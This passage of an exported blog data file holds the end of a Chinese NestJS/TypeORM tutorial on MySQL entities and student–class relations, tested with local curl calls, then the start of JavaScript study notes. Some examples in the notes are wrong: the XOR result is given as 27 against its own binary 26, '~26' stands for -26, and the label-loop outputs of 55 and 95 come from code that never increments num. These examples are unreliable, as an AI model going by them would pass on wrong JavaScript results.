class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.controller.ts</span></span><br><span class=\"line\"><span class=\"comment\">// import ...</span></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"comment\">// constructor whoAreYou whoAreYouPost whoIsReq ..</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Get</span>(<span class=\"string\">'get-name-by-id'</span>)</span><br><span class=\"line\">    getNameById(<span class=\"meta\">@Query</span>(<span class=\"string\">'id'</span>, ParseIntPipe) id: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.getStudentName(id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'set-student-name'</span>)</span><br><span class=\"line\">    setStudentName(<span class=\"meta\">@User</span>() user: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.setStudent(user);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>通过对 <code>service</code> 的调用, 再经 <code>controller</code> 调用产生如下结果</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅ 命令行访问</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/<span class=\"built_in\">set</span>-student-name -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"user\": \"gdccwxx\"&#125;'</span></span><br><span class=\"line\">// =&gt; &#123;<span class=\"string\">\"name\"</span>:<span class=\"string\">\"gdccwxx\"</span>,<span class=\"string\">\"id\"</span>:1,<span class=\"string\">\"updateDate\"</span>:<span class=\"string\">\"2021-09-12T15:57:14.599Z\"</span>,<span class=\"string\">\"createDate\"</span>:<span class=\"string\">\"2021-09-12T15:57:14.599Z\"</span>&#125;%</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 浏览器访问</span><br><span class=\"line\">http://localhost:3000/students/get-name-by-id?id=1</span><br><span class=\"line\"></span><br><span class=\"line\">// =&gt; [&#123;</span><br><span class=\"line\">//  id: 1,</span><br><span class=\"line\">//  name: <span class=\"string\">\"gdccwxx\"</span>,</span><br><span class=\"line\">//  updateDate: <span class=\"string\">\"2021-09-12T15:57:14.599Z\"</span>,</span><br><span class=\"line\">//  createDate: <span class=\"string\">\"2021-09-12T15:57:14.599Z\"</span></span><br><span class=\"line\">// &#125;]</span><br></pre></td></tr></table></figure><p>通过对 <code>service</code> 的 save、find 调用，就能将数据完整存入数据库了。</p><h1 id=\"六、联表查询\"><a href=\"#六、联表查询\" class=\"headerlink\" title=\"六、联表查询\"></a>六、联表查询</h1><p>我们准备新建课程表<code>class</code>，每个班级可以有多个学生，一个学生隶属一个班级。</p><p>这样<code>学生</code>和<code>班级</code>就构成了 <code>n:1</code> 的关系。</p><p>为了方便展示，在学生模块下直接新增 <code>class.entity.ts</code> 文件。并通过 <code>@OneToMany</code> 关联 <code>students</code>。</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// classes.entity.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Entity, Column, PrimaryGeneratedColumn, UpdateDateColumn, CreateDateColumn, OneToMany &#125; <span class=\"keyword\">from</span> <span class=\"string\">'typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Student &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./students.entity'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Entity</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> Classes &#123;</span><br><span class=\"line\">  <span class=\"meta\">@PrimaryGeneratedColumn</span>()</span><br><span class=\"line\">  id: <span class=\"built_in\">number</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@Column</span>(&#123; <span class=\"keyword\">type</span>: <span class=\"string\">'varchar'</span> &#125;)</span><br><span class=\"line\">  className: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@OneToMany</span>(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> Student, <span class=\"function\"><span class=\"params\">student</span> =&gt;</span> student.class)</span><br><span class=\"line\">  students: Student[]</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@UpdateDateColumn</span>()</span><br><span class=\"line\">  updateDate: <span class=\"built_in\">Date</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@CreateDateColumn</span>()</span><br><span class=\"line\">  createDate: <span class=\"built_in\">Date</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>同时修改 <code>students.entity.ts</code>, 通过 <code>@ManyToOne</code> 引入 <code>Classes</code> 修改</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.entity.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;</span><br><span class=\"line\">    ManyToOne,</span><br><span class=\"line\">    <span class=\"comment\">// Entity...</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">from</span> <span class=\"string\">'typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Classes &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./classes.entity'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Entity</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> Student &#123;</span><br><span class=\"line\">  <span class=\"comment\">// id name updateDate, createDate...</span></span><br><span class=\"line\">  <span class=\"meta\">@ManyToOne</span>(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> Classes, <span class=\"function\"><span class=\"params\">classes</span> =&gt;</span> classes.students)</span><br><span class=\"line\">  <span class=\"keyword\">class</span>: Classes;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>注意：<code>classes</code> 表引用 <code>students</code> 是通过新建字段(<code>students\\class</code>)进行关联。</p><p>引用会最终在数据库变成<code>外键</code>连接。</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show create table student;</span><br><span class=\"line\">// =&gt;  CREATE TABLE `student` (</span><br><span class=\"line\">//   `id` int NOT NULL AUTO_INCREMENT,</span><br><span class=\"line\">//   `name` varchar(255) NOT NULL,</span><br><span class=\"line\">//   `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),</span><br><span class=\"line\">//   `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),</span><br><span class=\"line\">//   `classId` int DEFAULT NULL,    // 👈 注意这里</span><br><span class=\"line\">//   PRIMARY KEY (`id`),</span><br><span class=\"line\">//   KEY `FK_bd5c8f2ef67394162384a484ba1` (`classId`), // 👈 注意这里</span><br><span class=\"line\">//   CONSTRAINT `FK_bd5c8f2ef67394162384a484ba1` FOREIGN KEY (`classId`) REFERENCES `classes` (`id`) // 👈 注意这里</span><br><span class=\"line\">// ) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// 而 classes 表并无链接</span><br><span class=\"line\">show create table classes;</span><br><span class=\"line\">// CREATE TABLE `classes` (</span><br><span class=\"line\">//   `id` int NOT NULL AUTO_INCREMENT,</span><br><span class=\"line\">//   `className` varchar(255) NOT NULL,</span><br><span class=\"line\">//   `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),</span><br><span class=\"line\">//   `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),</span><br><span class=\"line\">//   PRIMARY KEY (`id`)</span><br><span class=\"line\">// ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br></pre></td></tr></table></figure><p>再引入表，详细操作可看第四步。</p><p><code>students.module.ts</code> 引入表<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.module.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Classes &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./entities/classes.entity'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">    imports: [TypeOrmModule.forFeature([Student, Classes])],</span><br><span class=\"line\">    providers: [StudentsService, Student, Classes],</span><br><span class=\"line\">    <span class=\"comment\">// ..</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsModule &#123;&#125;</span><br></pre></td></tr></table></figure><p></p><p><code>students.service.ts</code> 引入表, 并实现 <code>setClass</code>, <code>getClass</code> 方法</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; Classes &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./entities/classes.entity'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"meta\">@InjectRepository</span>(Student)</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"keyword\">private</span> readonly studentRepository: Repository&lt;Student&gt;,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"meta\">@InjectRepository</span>(Classes)</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"keyword\">private</span> readonly classRepository: Repository&lt;Classes&gt;,</span></span><br><span class=\"line\"><span class=\"params\">    </span>) &#123;&#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">     <span class=\"keyword\">async</span> setClass(name: <span class=\"built_in\">string</span>, studentIds: <span class=\"built_in\">number</span>[]) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> students = <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.studentRepository.find(&#123; where: studentIds &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">const</span> result = <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.classRepository.save(&#123;</span><br><span class=\"line\">            className: name,</span><br><span class=\"line\">            students: students, <span class=\"comment\">// 此处直接保存students 的实例，即直接从数据库取出来的数据</span></span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">async</span> findClass(id: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> result = <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.classRepository.find(&#123;</span><br><span class=\"line\">            where: &#123; id &#125;,</span><br><span class=\"line\">            relations: [<span class=\"string\">'students'</span>]</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>新增 <code>ClassesDto</code><br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// classes.dto.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; IsNotEmpty, IsString &#125; <span class=\"keyword\">from</span> <span class=\"string\">'class-validator'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> ClassesDto &#123;</span><br><span class=\"line\">    <span class=\"meta\">@IsNotEmpty</span>()</span><br><span class=\"line\">    <span class=\"meta\">@IsString</span>()</span><br><span class=\"line\">    className: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    students: <span class=\"built_in\">number</span>[]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p><code>students.controller.ts</code> 修改<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.controller.ts</span></span><br><span class=\"line\"><span class=\"comment\">// import ...</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"comment\">// constructor ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Get</span>(<span class=\"string\">'get-class'</span>)</span><br><span class=\"line\">    getClass(<span class=\"meta\">@Query</span>(<span class=\"string\">'id'</span>, ParseIntPipe) id: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.findClass(id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'set-class'</span>)</span><br><span class=\"line\">    setClass(<span class=\"meta\">@Body</span>() classes: ClassesDto) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.setClass(classes.className, classes.students);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p><code>调用接口</code>，先插入数据再查询数据。</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 再新增一条数据</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/<span class=\"built_in\">set</span>-student-name -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"user\": \"gdccwxx1\"&#125;'</span></span><br><span class=\"line\"></span><br><span class=\"line\">// 插入 classes 数据</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/<span class=\"built_in\">set</span>-class -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"className\": \"blog\", \"students\": [1,2]&#125;'</span></span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 通过浏览器，查询长啥样</span><br><span class=\"line\">http://localhost:3000/students/get-class?id=1</span><br><span class=\"line\">// =&gt; [&#123;</span><br><span class=\"line\">//  id: 1,</span><br><span class=\"line\">    className: <span class=\"string\">\"blog\"</span>,</span><br><span class=\"line\">    updateDate: <span class=\"string\">\"2021-09-15T01:05:38.055Z\"</span>,</span><br><span class=\"line\">    createDate: <span class=\"string\">\"2021-09-15T01:05:38.055Z\"</span>,</span><br><span class=\"line\">    students: [&#123;</span><br><span class=\"line\">        id: 1,</span><br><span class=\"line\">        name: <span class=\"string\">\"gdccwxx\"</span>,</span><br><span class=\"line\">        updateDate: <span class=\"string\">\"2021-09-15T01:05:38.000Z\"</span>,</span><br><span class=\"line\">        createDate: <span class=\"string\">\"2021-09-15T01:05:23.988Z\"</span></span><br><span class=\"line\">    &#125;,&#123;</span><br><span class=\"line\">        id: 2,</span><br><span class=\"line\">        name: <span class=\"string\">\"gdccwxx1\"</span>,</span><br><span class=\"line\">        updateDate: <span class=\"string\">\"2021-09-15T01:05:38.000Z\"</span>,</span><br><span class=\"line\">        createDate: <span class=\"string\">\"2021-09-15T01:05:28.084Z\"</span></span><br><span class=\"line\">    &#125;]</span><br><span class=\"line\">&#125;]</span><br></pre></td></tr></table></figure><h1 id=\"七、简单回顾\"><a href=\"#七、简单回顾\" class=\"headerlink\" title=\"七、简单回顾\"></a>七、简单回顾</h1><p>再回顾下本章：</p><ul><li>使用 <code>typeorm</code> 和 <code>mysql</code> 建立连接</li><li>使用 <code>entity</code> 文件创建数据库表</li><li><code>service</code> 使用对数据库的简单调用，包括<code>写入</code>和<code>读取</code></li><li>使用关系查询，将 <code>student</code> 和 <code>classes</code> 连接写入和查询</li></ul><p>至此，我们使用 <code>typeorm</code> 和 <code>mysql</code> 连接数据库就完成了。</p><p>完整示例可以在 <a href=\"https://github.com/gdccwxx/nest-test\" target=\"_blank\" rel=\"noopener\">github</a> 找到。</p><p><a href=\"/nestJs/nest-js-tutorial-4/\" title=\"下章\">下章</a>我们将主要讲 <code>NestJs</code> 的高级用法，包括 <code>管道</code>、<code>守卫</code>和<code>拦截器</code>。期待你的阅读。</p>"},{"title":"JavaScript高级程序设计重读—1-3章","date":"2017-07-11T01:03:44.000Z","dir":"javascript","keywords":"JavaScript高级程序设计","_content":"### 基本概念\n#### 关于script标签\n```\n<script src=\"/javascripts/application.js\" type=\"text/javascript\" charset=\"utf-8\" async defer></script>\n```\nscript标签共有src，type，charset，async，defer几个属性。在只有script时依然可以作用。\n1、async是可选的，意为立即下载脚本，但不妨碍页面中的其他操作。且其下载后文件的执行顺序不定。\n```\n<script src=\"1.js\" async></script>\n<script src=\"2.js\" async></script>\n```\n其下载后1.js和2.js不定制性。没有一定顺序，可能是1先，也可能是2先执行。\n\n2、charset是指定字符集，在不写的情况下，默认charset为‘utf-8’编码。\n3、type，在不谢的情况下默认值位‘text/javascript’\n4、src属性，src属性并不是非得引用xx.js,而是其只要正确引用返回MIME类型即可。(mime类型：MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。\nMIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。)如果有src属性，则script标签中即使有代码也不会执行。\n\n#### script标签位置\n由于浏览器是由上到下解析内容。如果放在head变迁内，浏览器要等其下载完成后，再去渲染整个页面。因此会有一段时间延迟渲染，造成用户体验差，因此，为了避免这个问题，现代web应用一般是放在body元素中页面内容的后面。加上defer延迟后，将在浏览器解析完成整个页面，即解析完成< /html>之后再执行js代码。\n\n_ps：defer，async都是先下载文件。加载页面完成后执行，但是不同点是defer保证js文件顺序执行，而async则不保证。_\n\n#### 标识符\n规则：\n1、第一个字符必须是字母、下划线，或美元符号\n2、其他字符可以使字母，下划线，美元符号或数字\n最佳采用驼峰式命名\n#### 变量\n未初始化的变量都有一个默认的值，undefined，若未使用var，则其将直接变成全局变量。可以使用逗号分隔，多个变量赋值，即\n```\nvar a = 0,\n    b = 1,\n    c = 2\n```\n#### 数据类型\nJavaScript共有5种基本数据类型和1种复杂数据类型。分别是：\nUndefined，Null，Boolean，Number，String；Object\n##### TYPEOF操作\ntypeof操作只能返回下列字符串\nundefined – 值未定义\nboolean – 布尔值\nstring — 字符串\nnumber – 数值\nobject – 对象或null\nfunction – 函数\n##### Undefined类型\n显示的对一个值赋值为undefined和不初始化某个变量，其都===undefined\n```\nvar message\n// var age   此变量未声明\ntypeof message // undefined\ntypeof age //undefined\n```\n_ps：对未初始化的变量执行typeof操作符会返回undefined，而对未声明的变量执行统一配发操作符同样也会返回undefined值。_\n##### Null类型\nNull类型是表示一个空对象指针，也正是typeof null 返回Object的原因了。因此在声明一个为初始化的对象时，应该赋值为Null,在判断语句if中，null代表false。因此常用其作为未初始对象的赋值\n##### Boolean类型\n| 数据类型 | 转换为true的值 | 转换位为false的值 |\n| --- | --- | --- |\n| Boolean | true | false |\n| String | 任何非空字符串 | “”空字符串 |\n| Number | 任何非零数值(包括无穷大) | 0和NaN |\n| Object | 任何对象 | null |\n| Undefined | 不存在的 | undefined |\n##### Number类型\n1、如果前缀为 0，则 JavaScript 会把数值常量解释为八进制数，如果前缀为 0 和 “x”，则解释为十六进制数。即\n```\nvar octalNum = 070 // 56\nvar hexNum1 = 0xA //10\n```\n在进行算术运算时其右会转化成10进制\n2、JavaScript中+0和-0是相等的\n3、由于浮点数的数值计算产生误差，即0.1 + 0.2 = 0.30000000000000004是因为给予IEEE754数值的浮点数计算的通病(详见：计算机系统基础－－第二章(数据的机器级表示与处理) – 浮点数的表示)\n4、由于浮点数的表示范围有限，因此其表示范围有Number.MIN_VALUE(最小值)和Number.MAX_VALUE(最大值)表示。采用isFinite()函数判断其是否溢出\n5、NaN表示not a number 是一个特殊的值，表示其转换不是一个数值。任何数值的算术运算对NaN的结果都是NaN，且NaN不等于其本身。判断是否是NaN有专门函数isNaN()来判断。传入参数会先尝试转换成number再判断。而测试对象时先调用对象的valueOf方法，在确定是否可以转换成数值，如果不能，再调用toString方法。在测试返回值。\n6、数值转换函数Number(),规则如下\n```\n(1)boolean,true转换成1，false转换成0\n(2)数值，简单传入和返回\n(3)null，返回0\n(4)undefined，返回NaN\n(5)字符串：   <1>转换为十进制数，并且将前面多余的0去除\n             <2>浮点数格式相同\n             <3>如果包含0x、0o，将其转换成10进制数\n             <4>空字符串转换为0\n             <5>其他格式外都转换成NaN\n(6)对象，先调用valueOf()方法，然后依照返回值，如果是NaN，则调用对象toString方法，再根据前面返回字符串\n```\n7、parseInt()，parseFloat()函数\nparseInt也是将传入参数转换成数值，与Number函数不同的地方是，parseInt函数会选取从首字符开始的数值，到非数值字符结束，即parseInt(‘123abc’)转换成123，而Number转换成NaN。\nparseInt可以接受第二个参数，代表转换成的基于格式。即\n```\nparseInt('10',2)  // 2\n```\n基于格式格式转化成相应十进制数\n##### String类型\n1、字符字面量，例如\\n(换行),\\t(制表)等等。这些字面量在字符串的任意位置都会被当做字符来解析。例如\n```\nvar a = '\\t\\t\\t'\na.length // 3\n```\n而a打印出来是三个制表\n2、字符串的特点。\n```\nvar lang = 'Java'\nlang = lang + 'Script'\n```\n开始时lang保存字符串Java，而第二行把lang的值重新定义为Java和script结合，这个操作首先创建一个能容纳10个字符的新字符串，然后在这个字符串中填入java 和script，最后一步是销毁原来的字符串java和字符串script。\n3、字符串的转换\n利用toString方法来将数值转化成string，而其参数是转化成不同进制\n```\nvar num = 11\nnum.toString() // '11'\nvar nums = 10\nnums.toString(2) // '1010'\n```\n在不是null和undefined的情况下，还可以调用String()函数其转换规则如下\n1、如果值有toString方法，调用其不带参数的toString方法\n2、如果值是null，返回’null’\n3、如果是undefined，返回’undefined’\n##### Object类型\n可以使用 var o = new Object()或者使用var o = new Object来构造Object实例。每个Object实例都有下列属性和方法\n1、constructor 保存着创建当前对象的函数\n2、hasOwnProperty 用于检查给定的属性在当前实例中(而不是实例的原型中)\n3、isPrototypeOf 用于检查传入的对象是否是当前对象的原型\n4、propertyIsEnumerable 用于检查给定的属性是否能用for-in语句来枚举\n5、toLocaleString 返回对象的字符串表示，该字符串与执行环境的地区对应\n6、toString 返回对象的字符串表示\n7、valueOf 返回对象的字符串、数值或布尔值\n##### 位操作符\n1、按位非 (NOT) ~\n```\nvar num1 = 25   // 二进制00000000000000000000000000011001\nvar num2 = ~num1// 二进制11111111111111111111111111100110\nnum2            // ~26\n```\n2、按位与 (AND) &\n```\nvar result = 25 & 3\nresult  // 1\n25 = 0000 0000 0000 0000 0000 0000 0001 1001\n3 =  0000 0000 0000 0000 0000 0000 0000 0011\n----------------------------------------------\nAND= 0000 0000 0000 0000 0000 0000 0000 0001\n```\n3、按位或 (OR) |\n```\nvar result = 25 | 3\nresult  // 27\n25 = 0000 0000 0000 0000 0000 0000 0001 1001\n3 =  0000 0000 0000 0000 0000 0000 0000 0011\n----------------------------------------------\nAND= 0000 0000 0000 0000 0000 0000 0001 1011\n```\n4、按位异或 (XOR) ^\n```\nvar result = 25 ^ 3\nresult  // 27\n25 = 0000 0000 0000 0000 0000 0000 0001 1001\n3 =  0000 0000 0000 0000 0000 0000 0000 0011\n----------------------------------------------\nAND= 0000 0000 0000 0000 0000 0000 0001 1010\n```\n5、 操作符\n```\n25**2 = 625\n```\n**代表次方\n#### 语句\nlabel语句结合break，continue语句\n```\nvar num = 0;\noutermost:\n    for (var i = 0; i < 10; i++) {\n        for (var j = 0; j < 10; j++) {\n            if (i == 5 && j == 5) {\n               break outermost\n            }\n        }\n    }\nnum // 55\nvar num = 0;\noutermost:\n    for (var i = 0; i < 10; i++) {\n        for (var j = 0; j < 10; j++) {\n            if (i == 5 && j == 5) {\n               continue outermost\n            }\n        }\n    }\nnum // 95\n```\nlable结合break，continue语句可以控制跳出位置\n#### with语句\n将代码作用域设定到特定对象中。\n```\nvar qs = location.search.substring(1)\nvar hostName = location.hostname\nvar url = location.href\n//使用with语句后\nwith(location){\n    var qs = search.substring(1)\n    var hostName = hostname\n    var url = href\n}\n```\n\n#### 